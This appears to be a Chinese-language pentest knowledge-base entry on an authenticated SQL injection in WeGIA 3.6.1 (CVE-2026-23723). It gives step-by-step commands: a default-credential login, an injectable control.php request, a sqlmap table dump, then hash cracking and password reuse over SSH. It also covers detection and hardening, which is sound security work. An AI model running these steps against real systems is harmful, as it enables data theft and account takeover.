---
id: web-generic-sqli-wegia-atendido-ocorrencia-id-memorando
title: WeGIA 3.6.1 Atendido_ocorrenciaControle id_memorando 认证后 SQL 注入（CVE-2026-23723）
type: scenario
domain: web
path: web/generic/sqli
technique: cms-authenticated-sqli-id-memorando
tags:
- wegia
- php
- sql-injection
- mariadb
- authenticated
- cms
- cve
cve:
- CVE-2026-23723
severity: high
confidence: high
affected_versions: WeGIA 3.6.1（3.6.2 修复）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:28:14+08:00'
  notes: 已对照原文核对；3.6.1 发布页与 sqlmap dump 截图一致，CVE-2026-23723/3.6.2 修复与原文一致；未独立复跑 PoC，任意文件读取未复现
url: /docs/web/generic/sqli/web-generic-sqli-wegia-atendido-ocorrencia-id-memorando/
draft: false
kb_aliases:
- CVE-2026-23723
- WeGIA SQL 注入
- Atendido_ocorrenciaControle SQLi
- id_memorando 注入
- control.php nomeClasse 注入
- WeGIA listarTodosComAnexo
---

## 一句话结论

WeGIA 3.6.1 的前端控制器 `controle/control.php` 通过 `nomeClasse`/`metodo` 动态路由到 `Atendido_ocorrenciaControle::listarTodosComAnexo`，`id_memorando` 参数未做参数化即进入 SQL；登录后（登录页直接给出默认口令 admin/wegia）用 sqlmap 可拖出 `wegia` 库全表，本文导出 `pessoa` 表 7 条用户记录及未加盐 SHA-256 哈希，进而破解口令横向。CVE-2026-23723，3.6.2 修复。

## 原理

- `controle/control.php` 是 WeGIA 的统一入口控制器：请求参数 `nomeClasse` 指定业务类、`metodo` 指定方法，控制器按名字实例化并调用。这种设计把“可调用的业务方法”暴露为 URL 参数，`Atendido_ocorrenciaControle::listarTodosComAnexo` 就是其中一个可直达的方法。
- `listarTodosComAnexo` 按 `id_memorando` 查询附件/备忘录记录；该参数是数字形态，开发者直接拼进 SQL 而没有使用预处理参数，数字/引号边界均可被注入。
- 注入成立后，数据库权限内的读操作都可执行：`sqlmap -r` 对 `id_memorando=1*` 识别出注入点，并成功 dump `wegia.pessoa`（7 行，含 `cpf`、`nome`、`senha` 等列）。由于是认证后接口，攻击者需要先有一个会话；本文登录页直接标注默认凭据 `admin/wegia`，且库中 admin 的哈希也对应 `wegia`，默认口令未改时门槛极低。
- 危害升级：`pessoa.senha` 保存的是无盐 SHA-256，dump 后可离线/在线反查；本文用 CrackStation 还原出 `wegia`、`Password123!!` 等明文，随后把口令复用到域账户并 SSH 登录，把 Web 注入转成系统/域入口。CVE 描述还称可导致任意文件读取，但本文未给出文件读取的实际利用证据，只能作为潜在影响。
- 版本判定：`/.release` 返回 Unix 时间戳，对照 GitHub 发布页确认 CMS 为 WeGIA 3.6.1；CVE-2026-23723 在 3.6.2 修复。

## 触发条件

- 目标为 WeGIA 3.6.1（或受该 CVE 影响、未升级到 3.6.2 的版本）。
- 攻击者能获得一个有效会话；默认 `admin/wegia` 未修改时可直接登录，修改过则需要弱口令、凭据泄露或其他入口。
- Web 服务可访问 `controle/control.php`，后端为 MariaDB/MySQL。
- 数据库账户具备读取业务库（`wegia`）的权限；文件读取还要求数据库/应用具备相应文件权限与配置。

## 利用步骤

1. 判定版本：请求 `GET /.release` 得到 Unix 时间戳，转换后对照 WeGIA 官方发布记录（本文得到 3.6.1）。
2. 用默认凭据或已有凭据登录，取得 `PHPSESSID`：
   ```bash
   curl -i -c cookie.txt -d 'usuario=admin&senha=wegia' http://target/html/login.php
   ```
   登录表单字段以实际页面为准（常见 `usuario`/`senha`，脚本也可能使用 `cpf`/`pwd`）。
3. 构造注入请求并保存为 sqlmap 请求文件：
   ```http
   GET /controle/control.php?nomeClasse=Atendido_ocorrenciaControle&metodo=listarTodosComAnexo&id_memorando=1* HTTP/1.1
   Host: target
   Cookie: PHPSESSID=<session>
   ```
4. 用 sqlmap 确认并拖库：
   ```bash
   sqlmap -r custom.req --batch -D wegia -T pessoa --dump
   ```
5. 对 `senha` 列的 64 位十六进制值按 SHA-256 处理，在线反查或 `hashcat -m 1400` 离线破解，再把明文用于 SSH/SMB/LDAP/其他 Web 后台的口令复用尝试。

## PoC

```http
GET /controle/control.php?nomeClasse=Atendido_ocorrenciaControle&metodo=listarTodosComAnexo&id_memorando=1* HTTP/1.1
Host: bread.dsz
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=<authenticated-session>
Connection: close
```

```bash
sqlmap -r custom.req --batch -D wegia -T pessoa --dump
# 输出 7 行 pessoa 记录，senha 列为 64 位十六进制（SHA-256）
# 例：admin -> 9dcc9cbd309bfe63101c96687fb79ca847e9f238ce965f82eb44e8daf825cdbb -> wegia
```

说明：本文未给出注入点源码，PoC 以 sqlmap 实际 dump 截图为证；任意文件读取为 CVE 描述中的影响，本文未复现。

## 变体与关联

- **同控制器其他入口**：`control.php?nomeClasse=<类>&metodo=<方法>` 的路由方式意味着其他业务方法也可能存在同类拼接；枚举已登录页面中的 `nomeClasse`/`metodo` 组合可扩大攻击面。
- **参数形态变体**：数字型参数可能无需引号即可注入；若 sqlmap 未识别，可按布尔/时间盲注或 `--dbms=mariadb` 手工确认。
- **口令复用链**：库中哈希为无盐 SHA-256，破解成本低；同一口令可能复用于域账户、SSH、SMB 等。关联 [[pentest-lateral-movement-web-sqlite-db-md5-ssh-reuse]]（Web 数据泄露哈希后复用 SSH）、[[pentest-ad-password-spray-kerberos-reuse-winrm]]（破解口令对域用户喷洒）。
- **同产品其他漏洞**：[[web-php-rce-wegia-backup-filename-command-injection]]（WeGIA 备份恢复文件名命令注入，CVE-2026-28409），同一套 CMS 可组合利用。
- **影响边界**：默认口令已改且无法获得会话时，认证后注入不可达；数据库账户只读或网络受限时，文件读取/写文件不可用。

## 检测与防御

- **检测**：`control.php` 请求中 `id_memorando` 出现引号、`UNION`、`SLEEP`、`BENCHMARK`、注释符等特征；同一会话在短时间内对 `pessoa` 等表产生大量查询或响应体异常增大；sqlmap 默认 UA/请求节奏特征。
- **检测**：数据库审计中出现 `SELECT ... FROM pessoa` 的全表读取、`information_schema` 枚举；Web 日志出现 `nomeClasse`/`metodo` 参数被篡改的 500/200 长响应。
- **防御**：升级到 WeGIA 3.6.2 及以上；对 `id_memorando` 使用预处理语句/强制整型转换；控制器层对 `nomeClasse`/`metodo` 做白名单，禁止任意类/方法调用。
- **加固**：首次部署即修改默认管理员口令；数据库账户按最小权限拆分（Web 业务账户不授予 FILE 权限）；对数据库哈希使用 bcrypt/Argon2 等加盐慢哈希，避免无盐 SHA-256。
- **响应**：轮换数据库与管理员口令、排查同口令复用账户、审计 `pessoa` 等表的外泄记录与异常出站连接。
